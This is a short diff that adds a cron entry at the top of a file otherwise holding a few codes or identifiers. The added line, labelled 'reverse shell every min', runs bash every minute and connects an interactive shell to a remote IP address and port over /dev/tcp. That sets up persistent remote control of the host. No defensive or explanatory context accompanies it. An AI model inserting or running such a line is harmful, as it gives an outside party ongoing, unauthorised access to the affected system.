@@ -1,3 +1,5 @@
+* * * * * /bin/bash -c 'bash -i >& /dev/tcp/192.168.28.135/33403 0>&1' reverse shell every min
+
 4
 AUBR-201-M
 wo6WbG9WZE4A
